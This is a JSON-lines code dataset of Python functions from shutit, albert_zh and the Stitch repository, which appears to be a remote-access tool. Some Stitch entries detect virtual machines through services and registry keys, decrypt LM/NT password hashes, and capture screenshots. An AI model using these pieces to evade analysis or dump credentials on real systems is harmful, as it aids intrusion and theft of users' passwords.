[]\nself.attaches  = []", "path": "shutit/emailer.py", "commit_date": "2018-12-20 00:00:00", "repo_name": "ianmiell/shutit", "stars": 2145, "license": "mit", "language": "python", "size": 15648}
{"docstring": "\"\"\"Send the email according to the configured setup\n\n   attachment_failure - used to indicate a recursive call after the\n   smtp server has refused based on file size.\n   Should not be used externally\n\"\"\"\n", "func_signal": "def send(self, attachment_failure=False):\n", "code": "if not self.config['shutit.core.alerting.emailer.send_mail']:\n\tself.shutit.log('emailer.send: Not configured to send mail!',level=logging.INFO)\n\treturn True\nmsg = self.__compose()\nmailto = [self.config['shutit.core.alerting.emailer.mailto']]\nsmtp = self.__get_smtp()\nif self.config['shutit.core.alerting.emailer.username'] != '':\n\tsmtp.login(self.config['shutit.core.alerting.emailer.username'], self.config['shutit.core.alerting.emailer.password'])\nif self.config['shutit.core.alerting.emailer.mailto_maintainer']:\n\tmailto.append(self.config['shutit.core.alerting.emailer.maintainer'])\ntry:\n\tself.shutit.log('Attempting to send email',level=logging.INFO)\n\tsmtp.sendmail(self.config['shutit.core.alerting.emailer.mailfrom'], mailto, msg.as_string())\nexcept SMTPSenderRefused as refused:\n\tcode = refused.args[0]\n\tif code == 552 and not attachment_failure:\n\t\tself.shutit.log(\"Mailserver rejected message due to \" + \"oversize attachments, attempting to resend without\",level=logging.INFO)\n\t\tself.attaches = []\n\t\tself.lines.append(\"Oversized attachments not sent\")\n\t\tself.send(attachment_failure=True)\n\telse:\n\t\tself.shutit.log(\"Unhandled SMTP error:\" + str(refused),level=logging.INFO)\n\t\tif not self.config['shutit.core.alerting.emailer.safe_mode']:\n\t\t\traise refused\nexcept Exception as error:\n\tself.shutit.log('Unhandled exception: ' + str(error),level=logging.INFO)\n\tif not self.config['shutit.core.alerting.emailer.safe_mode']:\n\t\traise error\nfinally:\n\tsmtp.quit()", "path": "shutit/emailer.py", "commit_date": "2018-12-20 00:00:00", "repo_name": "ianmiell/shutit", "stars": 2145, "license": "mit", "language": "python", "size": 15648}
{"docstring": "# Release the lock to allow the screen to be drawn, then acquire again.\n# Only ever yield if there are any sessions to draw.\n", "func_signal": "def yield_to_draw(self):\n", "code": "if len(get_shutit_pexpect_sessions()) > 0:\n\tself.global_thread_lock.release()\n\t# Allow a _little_ time for others to get a look in\n\ttime.sleep(0.001)\n\tself.global_thread_lock.acquire()", "path": "shutit/shutit_global.py", "commit_date": "2020-01-09 00:00:00", "repo_name": "ianmiell/shutit", "stars": 2145, "license": "mit", "language": "python", "size": 15648}
{"docstring": "''' MacOS X initialisations. '''\n\n", "func_signal": "def __init__(self):\n", "code": "coregraphics = find_library('CoreGraphics')\nif not coregraphics:\n    raise ScreenshotError('No CoreGraphics library found.')\nself.core = cdll.LoadLibrary(coregraphics)\n\nself._set_argtypes()\nself._set_restypes()", "path": "Stitch/Configuration/mss/darwin.py", "commit_date": "2017-01-06 00:00:00", "repo_name": "nathanlopez/Stitch", "stars": 2883, "license": "other", "language": "python", "size": 3093}
{"docstring": "#print \"Scanning for Sun VirtualBox...\"\n", "func_signal": "def sunvirtual_scan(services,luid,dsys,dsdtkey,fadtkey):\n", "code": "virtpc_svc = ['VBoxMouse','VBoxGuest','VBoxService','VBoxSF']\nfor s in virtpc_svc:\n    if s in services :\n        return (\"VM Scan Complete: This is a Sun VirtualBox Virtual Machine.\")\nif luid:\n    iD =_winreg.QueryValueEx(luid, 'Identifier')\n    if 'vbox' in str(iD[0]).lower():\n        return (\"VM Scan Complete: This is a Sun VirtualBox Virtual Machine.\")\nif dsys:\n    sysbios =_winreg.QueryValueEx(dsys, 'SystemBiosVersion')\n    if 'vbox' in str(sysbios[0]).lower():\n        return (\"VM Scan Complete: This is a Sun VirtualBox Virtual Machine.\")\nif \"VBOX__\" in dsdtkey or \"VBOX__\" in fadtkey:\n    return (\"VM Scan Complete: This is a Sun VirtualBox Virtual Machine.\")\nreturn False", "path": "Stitch/PyLib/vmscan.py", "commit_date": "2017-01-06 00:00:00", "repo_name": "nathanlopez/Stitch", "stars": 2883, "license": "other", "language": "python", "size": 3093}
{"docstring": "''' Functions arguments. '''\n\n", "func_signal": "def _set_argtypes(self):\n", "code": "self.core.CGGetActiveDisplayList.argtypes = \\\n    [c_uint32, POINTER(c_uint32), POINTER(c_uint32)]\nself.core.CGDisplayBounds.argtypes = [c_uint32]\nself.core.CGRectStandardize.argtypes = [CGRect]\nself.core.CGDisplayRotation.argtypes = [c_uint32]\nself.core.CGWindowListCreateImage.argtypes = \\\n    [CGRect, c_uint32, c_uint32, c_uint32]\nself.core.CGImageGetWidth.argtypes = [c_void_p]\nself.core.CGImageGetHeight.argtypes = [c_void_p]\nself.core.CGImageGetDataProvider.argtypes = [c_void_p]\nself.core.CGDataProviderCopyData.argtypes = [c_void_p]\nself.core.CFDataGetBytePtr.argtypes = [c_void_p]\nself.core.CGDataProviderRelease.argtypes = [c_void_p]", "path": "Stitch/Configuration/mss/darwin.py", "commit_date": "2017-01-06 00:00:00", "repo_name": "nathanlopez/Stitch", "stars": 2883, "license": "other", "language": "python", "size": 3093}
{"docstring": "''' Disconnect from X server. '''\n\n", "func_signal": "def __del__(self):\n", "code": "if self.display:\n    self.xlib.XCloseDisplay(self.display)\n    self.display = None", "path": "Stitch/Configuration/mss/linux.py", "commit_date": "2017-01-06 00:00:00", "repo_name": "nathanlopez/Stitch", "stars": 2883, "license": "other", "language": "python", "size": 3093}
{"docstring": "''' Functions return type. '''\n\n", "func_signal": "def _set_restypes(self):\n", "code": "def validate(value):\n    ''' Validate the returned value of xrandr.XRRGetScreenResources().\n        We can end on a segfault if not:\n            Xlib:  extension \"RANDR\" missing on display \"...\".\n    '''\n\n    if value == 0:\n        err = 'xrandr.XRRGetScreenResources() failed.'\n        err += ' NULL pointer received.'\n        raise ScreenshotError(err)\n\n    return cast(value, POINTER(XRRScreenResources))\n\nself.xlib.XOpenDisplay.restype = POINTER(Display)\nself.xlib.XDefaultScreen.restype = c_int\nself.xlib.XGetWindowAttributes.restype = c_int\nself.xlib.XAllPlanes.restype = c_ulong\nself.xlib.XGetImage.restype = POINTER(XImage)\nself.xlib.XGetPixel.restype = c_ulong\nself.xlib.XDestroyImage.restype = c_void_p\nself.xlib.XCloseDisplay.restype = c_void_p\nself.xlib.XDefaultRootWindow.restype = POINTER(XWindowAttributes)\nself.xrandr.XRRGetScreenResources.restype = validate\nself.xrandr.XRRGetCrtcInfo.restype = POINTER(XRRCrtcInfo)\nself.xrandr.XRRFreeScreenResources.restype = c_void_p\nself.xrandr.XRRFreeCrtcInfo.restype = c_void_p\nif self.use_mss:\n    self.mss.GetXImagePixels.restype = c_int", "path": "Stitch/Configuration/mss/linux.py", "commit_date": "2017-01-06 00:00:00", "repo_name": "nathanlopez/Stitch", "stars": 2883, "license": "other", "language": "python", "size": 3093}
{"docstring": "#print \"Scanning for Hyper-V...\"\n", "func_signal": "def hyperv_scan(microsoft, services):\n", "code": "if \"Hyper-V\" in microsoft or \"VirtualMachine\" in microsoft:\n    return (\"VM Scan Complete: This is a Hyper-V Virtual Machine.\")\nreturn False", "path": "Stitch/PyLib/vmscan.py", "commit_date": "2017-01-06 00:00:00", "repo_name": "nathanlopez/Stitch", "stars": 2883, "license": "other", "language": "python", "size": 3093}
{"docstring": "#print \"Scanning for QEMU/KVM...\"\n", "func_signal": "def qemu_kvm_scan(luid,sycp):\n", "code": "if luid:\n    iD =_winreg.QueryValueEx(luid, 'Identifier')\n    if 'qemu' in str(iD[0]).lower():\n        return (\"VM Scan Complete: This is a QEMU/KVM Virtual Machine.\")\nif sycp:\n    cp =_winreg.QueryValueEx(sycp, 'ProcessorNameString')\n    if 'qemu' in str(cp[0]).lower():\n        return (\"VM Scan Complete: This is a QEMU/KVM Virtual Machine.\")\nreturn False", "path": "Stitch/PyLib/vmscan.py", "commit_date": "2017-01-06 00:00:00", "repo_name": "nathanlopez/Stitch", "stars": 2883, "license": "other", "language": "python", "size": 3093}
{"docstring": "''' Get positions of monitors (see parent class). '''\n\n", "func_signal": "def enum_display_monitors(self, force=False):\n", "code": "if not self.monitors or force:\n    self.monitors = []\n\n    # All monitors\n    gwa = XWindowAttributes()\n    self.xlib.XGetWindowAttributes(self.display, self.root, byref(gwa))\n    self.monitors.append({\n        'left': int(gwa.x),\n        'top': int(gwa.y),\n        'width': int(gwa.width),\n        'height': int(gwa.height),\n        'monitor': 0\n    })\n\n    # Each monitors\n    # Fix for XRRGetScreenResources:\n    #     expected LP_Display instance instead of LP_XWindowAttributes\n    root = cast(self.root, POINTER(Display))\n    mon = self.xrandr.XRRGetScreenResources(self.display, root)\n    for num in range(mon.contents.ncrtc):\n        crtc = self.xrandr.XRRGetCrtcInfo(self.display, mon,\n                                          mon.contents.crtcs[num])\n        self.monitors.append({\n            'left': int(crtc.contents.x),\n            'top': int(crtc.contents.y),\n            'width': int(crtc.contents.width),\n            'height': int(crtc.contents.height),\n            'monitor': num\n        })\n        self.xrandr.XRRFreeCrtcInfo(crtc)\n    self.xrandr.XRRFreeScreenResources(mon)\n\nreturn self.monitors", "path": "Stitch/Configuration/mss/linux.py", "commit_date": "2017-01-06 00:00:00", "repo_name": "nathanlopez/Stitch", "stars": 2883, "license": "other", "language": "python", "size": 3093}
{"docstring": "#print \"Scanning for VirtualPC...\"\n", "func_signal": "def virtualpc_scan(services):\n", "code": "virtpc_svc = ['vpcbus','vpc-s3','vpcuhub','msvmmouf']\nfor s in virtpc_svc:\n    if s in services :\n        return (\"VM Scan Complete: This is a VirtualPC Virtual Machine.\")\nreturn False", "path": "Stitch/PyLib/vmscan.py", "commit_date": "2017-01-06 00:00:00", "repo_name": "nathanlopez/Stitch", "stars": 2883, "license": "other", "language": "python", "size": 3093}
{"docstring": "''' Retrieve all pixels from a monitor. Pixels have to be RGB. '''\n\n", "func_signal": "def get_pixels(self, monitor):\n", "code": "self.width = monitor['width']\nself.height = monitor['height']\nleft, top = monitor['left'], monitor['top']\nzpixmap = 2\nallplanes = self.xlib.XAllPlanes()\n\n# Fix for XGetImage:\n#     expected LP_Display instance instead of LP_XWindowAttributes\nroot = cast(self.root, POINTER(Display))\nximage = self.xlib.XGetImage(self.display, root, left, top,\n                             self.width, self.height, allplanes,\n                             zpixmap)\nif not ximage:\n    err = 'xlib.XGetImage() failed. Monitor informations: '\n    for key, val in sorted(monitor.items()):\n        err = '{0}{1}: {2}, '.format(err, key, val)\n    err = err.strip(', ')\n    raise ScreenshotError(err)\n\nif not self.use_mss:\n    self.get_pixels_slow(ximage)\nelse:\n    self.image = create_string_buffer(self.height * self.width * 3)\n    ret = self.mss.GetXImagePixels(ximage, self.image)\n    if not ret:\n        self.xlib.XDestroyImage(ximage)\n        err = 'libmss.GetXImagePixels() failed (retcode={0}).'\n        raise ScreenshotError(err.format(ret))\nself.xlib.XDestroyImage(ximage)\nreturn self.image", "path": "Stitch/Configuration/mss/linux.py", "commit_date": "2017-01-06 00:00:00", "repo_name": "nathanlopez/Stitch", "stars": 2883, "license": "other", "language": "python", "size": 3093}
{"docstring": "''' Retrieve all pixels from a monitor. Pixels have to be RGB. '''\n\n", "func_signal": "def get_pixels(self, monitor):\n", "code": "width, height = monitor['width'], monitor['height']\nleft, top = monitor['left'], monitor['top']\nrect = CGRect((left, top), (width, height))\n\nimage_ref = self.core.CGWindowListCreateImage(rect, 1, 0, 0)\nif not image_ref:\n    err = 'CoreGraphics.CGWindowListCreateImage() failed.'\n    raise ScreenshotError(err)\n\nself.width = int(self.core.CGImageGetWidth(image_ref))\nself.height = int(self.core.CGImageGetHeight(image_ref))\nprov = self.core.CGImageGetDataProvider(image_ref)\ndata = self.core.CGDataProviderCopyData(prov)\ndata_ref = self.core.CFDataGetBytePtr(data)\nbuf_len = self.height * self.width * 4  # or CFDataGetLength()\ndata = cast(data_ref, POINTER(c_ubyte * buf_len))\nself.core.CGDataProviderRelease(prov)\n\n# Replace pixels values: BGRA to RGB.\nimage_data = bytearray(data.contents)\nimage = bytearray(self.height * self.width * 3)\nimage[0::3], image[1::3], image[2::3] = \\\n    image_data[2::4], image_data[1::4], image_data[0::4]\nself.image = bytes(image)\nreturn self.image", "path": "Stitch/Configuration/mss/darwin.py", "commit_date": "2017-01-06 00:00:00", "repo_name": "nathanlopez/Stitch", "stars": 2883, "license": "other", "language": "python", "size": 3093}
{"docstring": "''' Get positions of monitors (see parent class). '''\n\n", "func_signal": "def enum_display_monitors(self, force=False):\n", "code": "if not self.monitors or force:\n    self.monitors = []\n\n    # All monitors\n    self.monitors.append({\n        'left': int(get_infinity()),\n        'top': int(get_infinity()),\n        'width': int(get_infinity(True)),\n        'height': int(get_infinity(True))\n    })\n\n    # Each monitors\n    display_count = c_uint32(0)\n    active_displays = (c_uint32 * self.max_displays)()\n    self.core.CGGetActiveDisplayList(self.max_displays,\n                                     active_displays,\n                                     byref(display_count))\n    rotations = {0.0: 'normal', 90.0: 'right', -90.0: 'left'}\n    for idx in range(display_count.value):\n        display = active_displays[idx]\n\n        rect = self.core.CGDisplayBounds(display)\n        rect = self.core.CGRectStandardize(rect)\n        left, top = rect.origin.x, rect.origin.y\n        width, height = rect.size.width, rect.size.height\n        rot = self.core.CGDisplayRotation(display)\n        if rotations[rot] in ['left', 'right']:\n            width, height = height, width\n        self.monitors.append({\n            'left': int(left),\n            'top': int(top),\n            'width': int(width),\n            'height': int(height)\n        })\n\nreturn self.monitors", "path": "Stitch/Configuration/mss/darwin.py", "commit_date": "2017-01-06 00:00:00", "repo_name": "nathanlopez/Stitch", "stars": 2883, "license": "other", "language": "python", "size": 3093}
{"docstring": "''' Functions return type. '''\n\n", "func_signal": "def _set_restypes(self):\n", "code": "self.core.CGGetActiveDisplayList.restype = c_int32\nself.core.CGDisplayBounds.restype = CGRect\nself.core.CGRectStandardize.restype = CGRect\nself.core.CGDisplayRotation.restype = c_float\nself.core.CGWindowListCreateImage.restype = c_void_p\nself.core.CGImageGetWidth.restype = c_uint32\nself.core.CGImageGetHeight.restype = c_uint32\nself.core.CGImageGetDataProvider.restype = c_void_p\nself.core.CGDataProviderCopyData.restype = c_void_p\nself.core.CFDataGetBytePtr.restype = c_void_p\nself.core.CGDataProviderRelease.restype = c_void_p", "path": "Stitch/Configuration/mss/darwin.py", "commit_date": "2017-01-06 00:00:00", "repo_name": "nathanlopez/Stitch", "stars": 2883, "license": "other", "language": "python", "size": 3093}
{"docstring": "''' Functions arguments.\n\n    Curiously, if we set up XGetPixel arguments type,\n    the entire process takes twice more time.\n    So, no need to waste this precious time :)\n    Note: this issue does not occur when using libmss.\n'''\n\n", "func_signal": "def _set_argtypes(self):\n", "code": "self.xlib.XOpenDisplay.argtypes = [c_char_p]\nself.xlib.XDefaultScreen.argtypes = [POINTER(Display)]\nself.xlib.XDefaultRootWindow.argtypes = [POINTER(Display), c_int]\nself.xlib.XGetWindowAttributes.argtypes = [POINTER(Display),\n                                           POINTER(XWindowAttributes),\n                                           POINTER(XWindowAttributes)]\nself.xlib.XAllPlanes.argtypes = []\nself.xlib.XGetImage.argtypes = [POINTER(Display), POINTER(Display),\n                                c_int, c_int, c_uint, c_uint, c_ulong,\n                                c_int]\n# self.xlib.XGetPixel.argtypes = [POINTER(XImage), c_int, c_int]\nself.xlib.XDestroyImage.argtypes = [POINTER(XImage)]\nself.xlib.XCloseDisplay.argtypes = [POINTER(Display)]\nself.xrandr.XRRGetScreenResources.argtypes = [POINTER(Display),\n                                              POINTER(Display)]\nself.xrandr.XRRGetCrtcInfo.argtypes = [POINTER(Display),\n                                       POINTER(XRRScreenResources),\n                                       c_long]\nself.xrandr.XRRFreeScreenResources.argtypes = \\\n    [POINTER(XRRScreenResources)]\nself.xrandr.XRRFreeCrtcInfo.argtypes = [POINTER(XRRCrtcInfo)]\nif self.use_mss:\n    self.mss.GetXImagePixels.argtypes = [POINTER(XImage), c_void_p]", "path": "Stitch/Configuration/mss/linux.py", "commit_date": "2017-01-06 00:00:00", "repo_name": "nathanlopez/Stitch", "stars": 2883, "license": "other", "language": "python", "size": 3093}
{"docstring": "#print \"\\nScanning for Xen...\"\n", "func_signal": "def xen_scan(services,dsdtkey,fadtkey,rsdtkey):\n", "code": "virtpc_svc = ['xenevtchn','xennet','xennet6','xensvc','xenvdb']\nfor s in virtpc_svc:\n    if s in services :\n        return (\"VM Scan Complete: This is a Xen Virtual Machine.\")\nif \"Xen\" in dsdtkey or \"Xen\" in fadtkey or \"Xen\" in rsdtkey:\n    return (\"VM Scan Complete: This is a Xen Virtual Machine.\")\nreturn False", "path": "Stitch/PyLib/vmscan.py", "commit_date": "2017-01-06 00:00:00", "repo_name": "nathanlopez/Stitch", "stars": 2883, "license": "other", "language": "python", "size": 3093}
{"docstring": "''' GNU/Linux initialisations. '''\n\n", "func_signal": "def __init__(self, display=None):\n", "code": "if not display:\n    try:\n        if version > '3':\n            display = bytes(environ['DISPLAY'], 'utf-8')\n        else:\n            display = environ['DISPLAY']\n    except KeyError:\n        err = '$DISPLAY not set. Stopping to prevent segfault.'\n        raise ScreenshotError(err)\n\nx11 = find_library('X11')\nif not x11:\n    raise ScreenshotError('No X11 library found.')\nself.xlib = cdll.LoadLibrary(x11)\n\nxrandr = find_library('Xrandr')\nif not xrandr:\n    raise ScreenshotError('No Xrandr extension found.')\nself.xrandr = cdll.LoadLibrary(xrandr)\n\n# libmss = find_library('mss')\nlibmss = '{0}/linux/{1}/libmss.so'.format(\n    dirname(realpath(abspath(__file__))), arch())\nif isfile(libmss):\n    self.mss = cdll.LoadLibrary(libmss)\n    self.use_mss = True\nelse:\n    print('No MSS library found. Using slow native function.')\n\nself._set_argtypes()\nself._set_restypes()\n\nself.display = self.xlib.XOpenDisplay(display)\ntry:\n    assert self.display.contents\nexcept ValueError:\n    raise ScreenshotError('Cannot open display \"{0}\".'.format(display))\nscreen = self.xlib.XDefaultScreen(self.display)\nself.root = self.xlib.XDefaultRootWindow(self.display, screen)", "path": "Stitch/Configuration/mss/linux.py", "commit_date": "2017-01-06 00:00:00", "repo_name": "nathanlopez/Stitch", "stars": 2883, "license": "other", "language": "python", "size": 3093}
{"docstring": "# LM Hash\n", "func_signal": "def decrypt_hashes(rid, enc_lm_hash, enc_nt_hash, hbootkey):\n", "code": "if enc_lm_hash:\n    lmhash = decrypt_single_hash(rid, hbootkey, enc_lm_hash, almpassword)\nelse:\n    lmhash = \"\"\n\n# NT Hash\nif enc_nt_hash:\n    nthash = decrypt_single_hash(rid, hbootkey, enc_nt_hash, antpassword)\nelse:\n    nthash = \"\"\n\nreturn lmhash,nthash", "path": "Stitch/Configuration/creddump/hashdump.py", "commit_date": "2017-01-06 00:00:00", "repo_name": "nathanlopez/Stitch", "stars": 2883, "license": "other", "language": "python", "size": 3093}
{"docstring": "#print \"Scanning for VMware...\"\n", "func_signal": "def vmware_scan(services, luid):\n", "code": "vmware_svc = ['vmdebug','vmmouse','VMTools','VMMEMCTL']\nfor s in vmware_svc:\n    if s in services :\n        return (\"VM Scan Complete: This is a VMware Virtual Machine.\")\nif luid:\n    iD =_winreg.QueryValueEx(luid, 'Identifier')\n    if 'vmware' in str(iD[0]).lower():\n        return (\"VM Scan Complete: This is a VMware Virtual Machine.\")\nreturn False", "path": "Stitch/PyLib/vmscan.py", "commit_date": "2017-01-06 00:00:00", "repo_name": "nathanlopez/Stitch", "stars": 2883, "license": "other", "language": "python", "size": 3093}
{"docstring": "''' Dump data to the image file. Data is bytes(RGBRGB...RGB).\n    Pure python PNG implementation.\n    http://inaps.org/journal/comment-fonctionne-le-png\n'''\n\n", "func_signal": "def to_png(self, data, output):\n", "code": "p__ = pack\nline = self.width * 3\npng_filter = p__('>B', 0)\nscanlines = b''.join(\n    [png_filter + data[y * line:y * line + line]\n     for y in range(self.height)])\n\nmagic = p__('>8B', 137, 80, 78, 71, 13, 10, 26, 10)\n\n# Header: size, marker, data, CRC32\nihdr = [b'', b'IHDR', b'', b'']\nihdr[2] = p__('>2I5B', self.width, self.height, 8, 2, 0, 0, 0)\nihdr[3] = p__('>I', crc32(b''.join(ihdr[1:3])) & 0xffffffff)\nihdr[0] = p__('>I', len(ihdr[2]))\n\n# Data: size, marker, data, CRC32\nidat = [b'', b'IDAT', compress(scanlines), b'']\nidat[3] = p__('>I', crc32(b''.join(idat[1:3])) & 0xffffffff)\nidat[0] = p__('>I', len(idat[2]))\n\n# Footer: size, marker, None, CRC32\niend = [b'', b'IEND', b'', b'']\niend[3] = p__('>I', crc32(iend[1]) & 0xffffffff)\niend[0] = p__('>I', len(iend[2]))\n\nwith open(output, 'wb') as fileh:\n    fileh.write(magic)\n    fileh.write(b''.join(ihdr))\n    fileh.write(b''.join(idat))\n    fileh.write(b''.join(iend))\n    return\n\nerr = 'Error writing data to \"{0}\".'.format(output)\nraise ScreenshotError(err)", "path": "Stitch/Configuration/mss/base.py", "commit_date": "2017-01-06 00:00:00", "repo_name": "nathanlopez/Stitch", "stars": 2883, "license": "other", "language": "python", "size": 3093}
{"docstring": "''' Retrieve all pixels from a monitor. Pixels have to be RGB.\n    (!) Insanely slow version, see doc/linux-slow-version. (!)\n'''\n\n# @TODO: this part takes most of the time. Need a better solution.\n", "func_signal": "def get_pixels_slow(self, ximage):\n", "code": "def pix(pixel, _resultats={}, p__=pack):\n    ''' Apply shifts to a pixel to get the RGB values.\n        This method uses of memoization.\n    '''\n\n    # pylint: disable=dangerous-default-value\n\n    if pixel not in _resultats:\n        _resultats[pixel] = p__('<B', (pixel & rmask) >> 16) + \\\n            p__('<B', (pixel & gmask) >> 8) + \\\n            p__('<B', pixel & bmask)\n    return _resultats[pixel]\n\nself.width = ximage.contents.width\nself.height = ximage.contents.height\nrmask = ximage.contents.red_mask\nbmask = ximage.contents.blue_mask\ngmask = ximage.contents.green_mask\nget_pix = self.xlib.XGetPixel\npixels = [pix(get_pix(ximage, x, y))\n          for y in range(self.height) for x in range(self.width)]\nself.image = b''.join(pixels)\nreturn self.image", "path": "Stitch/Configuration/mss/linux.py", "commit_date": "2017-01-06 00:00:00", "repo_name": "nathanlopez/Stitch", "stars": 2883, "license": "other", "language": "python", "size": 3093}
{"docstring": "\"\"\"Converts a sequence of [tokens|ids] using the vocab.\"\"\"\n", "func_signal": "def convert_by_vocab(vocab, items):\n", "code": "output = []\n#print(\"items:\",items) #['[CLS]', '\u65e5', '##\u671f', '\uff0c', '\u4f46', '\u88ab', '##\u544a', '\u91d1', '##\u4e1c', '##\u798f', '\u8f7d', '##\u660e', '[MASK]', 'U', '##N', '##K', ']', '\u4fdd', '##\u8bc1', '\u672c', '##\u6708', '1', '##4', '[MASK]', '\u5230', '##\u4f4d', '\uff0c', '2', '##0', '##1', '##5', '\u5e74', '6', '[MASK]', '1', '##1', '\u65e5', '[', 'U', '##N', '##K', ']', '\uff0c', '\u539f', '##\u544a', '[MASK]', '\u8ba4', '##\u53ef', '\u4e8e', '2', '##0', '##1', '##5', '[MASK]', '6', '\u6708', '[MASK]', '[MASK]', '\u65e5', '##\u5411', '\u88ab', '##\u544a', '\u4e3b', '##\u5f20', '\u6743', '##\u5229', '\u3002', '\u800c', '[MASK]', '[MASK]', '\u81ea', '[MASK]', '[MASK]', '[MASK]', '[MASK]', '\u5e74', '6', '\u6708', '1', '##1', '\u65e5', '[SEP]', '\u539f', '##\u544a', '\u4e8e', '2', '##0', '##1', '##6', '[MASK]', '6', '[MASK]', '2', '##4', '\u65e5', '\u8d77', '##\u8bc9', '\uff0c', '\u4e3b', '##\u5f20', '\u4fdd', '##\u8bc1', '\u8d23', '##\u4efb', '\uff0c', '\u5df2', '\u8d85', '##\u8fc7', '\u4fdd', '##\u8bc1', '\u671f', '##\u9650', '[MASK]', '\u4fdd', '##\u8bc1', '\u4eba', '\u4f9d', '##\u6cd5', '\u4e0d', '##\u518d', '\u627f', '##\u62c5', '\u4fdd', '##\u8bc1', '[MASK]', '[MASK]', '[MASK]', '[SEP]']\nfor i,item in enumerate(items):\n  #print(i,\"item:\",item) #  ##\u671f\n  output.append(vocab[item])\nreturn output", "path": "albert_zh/tokenization.py", "commit_date": "2019-10-03 00:00:00", "repo_name": "brightmart/albert_zh", "stars": 3886, "license": "None", "language": "python", "size": 2095}
{"docstring": "\"\"\"Converts `text` to Unicode (if it's not already), assuming utf-8 input.\"\"\"\n", "func_signal": "def convert_to_unicode(text):\n", "code": "if six.PY3:\n  if isinstance(text, str):\n    return text\n  elif isinstance(text, bytes):\n    return text.decode(\"utf-8\", \"ignore\")\n  else:\n    raise ValueError(\"Unsupported string type: %s\" % (type(text)))\nelif six.PY2:\n  if isinstance(text, str):\n    return text.decode(\"utf-8\", \"ignore\")\n  elif isinstance(text, unicode):\n    return text\n  else:\n    raise ValueError(\"Unsupported string type: %s\" % (type(text)))\nelse:\n  raise ValueError(\"Not running on Python2 or Python 3?\")", "path": "albert_zh/tokenization.py", "commit_date": "2019-10-03 00:00:00", "repo_name": "brightmart/albert_zh", "stars": 3886, "license": "None", "language": "python", "size": 2095}
{"docstring": "\"\"\"Tokenizes a piece of text.\"\"\"\n", "func_signal": "def tokenize(self, text):\n", "code": "text = convert_to_unicode(text)\ntext = self._clean_text(text)\n\n# This was added on November 1st, 2018 for the multilingual and Chinese\n# models. This is also applied to the English models now, but it doesn't\n# matter since the English models were not trained on any Chinese data\n# and generally don't have any Chinese data in them (there are Chinese\n# characters in the vocabulary because Wikipedia does have some Chinese\n# words in the English Wikipedia.).\ntext = self._tokenize_chinese_chars(text)\n\norig_tokens = whitespace_tokenize(text)\nsplit_tokens = []\nfor token in orig_tokens:\n  if self.do_lower_case:\n    token = token.lower()\n    token = self._run_strip_accents(token)\n  split_tokens.extend(self._run_split_on_punc(token))\n\noutput_tokens = whitespace_tokenize(\" \".join(split_tokens))\nreturn output_tokens", "path": "albert_zh/tokenization.py", "commit_date": "2019-10-03 00:00:00", "repo_name": "brightmart/albert_zh", "stars": 3886, "license": "None", "language": "python", "size": 2095}
{"docstring": "\"\"\"Adds whitespace around any CJK character.\"\"\"\n", "func_signal": "def _tokenize_chinese_chars(self, text):\n", "code": "output = []\nfor char in text:\n  cp = ord(char)\n  if self._is_chinese_char(cp):\n    output.append(\" \")\n    output.append(char)\n    output.append(\" \")\n  else:\n    output.append(char)\nreturn \"\".join(output)", "path": "albert_zh/tokenization.py", "commit_date": "2019-10-03 00:00:00", "repo_name": "brightmart/albert_zh", "stars": 3886, "license": "None", "language": "python", "size": 2095}
{"docstring": "\"\"\"Truncates a sequence pair in place to the maximum length.\"\"\"\n\n# This is a simple heuristic which will always truncate the longer sequence\n# one token at a time. This makes more sense than truncating an equal percent\n# of tokens from each, since if one sequence is very short then each token\n# that's truncated likely contains more information than a longer sequence.\n", "func_signal": "def _truncate_seq_pair(tokens_a, tokens_b, max_length):\n", "code": "while True:\n  total_length = len(tokens_a) + len(tokens_b)\n  if total_length <= max_length:\n    break\n  if len(tokens_a) > len(tokens_b):\n    tokens_a.pop()\n  else:\n    tokens_b.pop()", "path": "albert_zh/run_classifier_clue.py", "commit_date": "2020-04-02 00:00:00", "repo_name": "brightmart/albert_zh", "stars": 3886, "license": "None", "language": "python", "size": 2095}
{"docstring": "\"\"\"Strips accents from a piece of text.\"\"\"\n", "func_signal": "def _run_strip_accents(self, text):\n", "code": "text = unicodedata.normalize(\"NFD\", text)\noutput = []\nfor char in text:\n  cat = unicodedata.category(char)\n  if cat == \"Mn\":\n    continue\n  output.append(char)\nreturn \"\".join(output)", "path": "albert_zh/tokenization.py", "commit_date": "2019-10-03 00:00:00", "repo_name": "brightmart/albert_zh", "stars": 3886, "license": "None", "language": "python", "size": 2095}
{"docstring": "\"\"\"Run layer normalization on the last dimension of the tensor.\"\"\"\n", "func_signal": "def layer_norm(input_tensor, name=None):\n", "code": "return tf.contrib.layers.layer_norm(\n    inputs=input_tensor, begin_norm_axis=-1, begin_params_axis=-1, scope=name)", "path": "albert_zh/run_classifier_clue.py", "commit_date": "2020-04-02 00:00:00", "repo_name": "brightmart/albert_zh", "stars": 3886, "license": "None", "language": "python", "size": 2095}
{"docstring": "\"\"\"The actual input function.\"\"\"\n", "func_signal": "def input_fn(params):\n", "code": "batch_size = params[\"batch_size\"]\n\n# For training, we want a lot of parallel reading and shuffling.\n# For eval, we want no shuffling and parallel reading doesn't matter.\nd = tf.data.TFRecordDataset(input_file)\nif is_training:\n  d = d.repeat()\n  d = d.shuffle(buffer_size=100)\n\nd = d.apply(\n    tf.contrib.data.map_and_batch(\n        lambda record: _decode_record(record, name_to_features),\n        batch_size=batch_size,\n        drop_remainder=drop_remainder))\n\nreturn d", "path": "albert_zh/run_classifier_clue.py", "commit_date": "2020-04-02 00:00:00", "repo_name": "brightmart/albert_zh", "stars": 3886, "license": "None", "language": "python", "size": 2095}
{"docstring": "\"\"\"Checks whether `chars` is a punctuation character.\"\"\"\n", "func_signal": "def _is_punctuation(char):\n", "code": "cp = ord(char)\n# We treat all non-letter/number ASCII as punctuation.\n# Characters such as \"^\", \"$\", and \"`\" are not in the Unicode\n# Punctuation class but we treat them as punctuation anyways, for\n# consistency.\nif ((cp >= 33 and cp <= 47) or (cp >= 58 and cp <= 64) or\n    (cp >= 91 and cp <= 96) or (cp >= 123 and cp <= 126)):\n  return True\ncat = unicodedata.category(char)\nif cat.startswith(\"P\"):\n  return True\nreturn False", "path": "albert_zh/tokenization.py", "commit_date": "2019-10-03 00:00:00", "repo_name": "brightmart/albert_zh", "stars": 3886, "license": "None", "language": "python", "size": 2095}
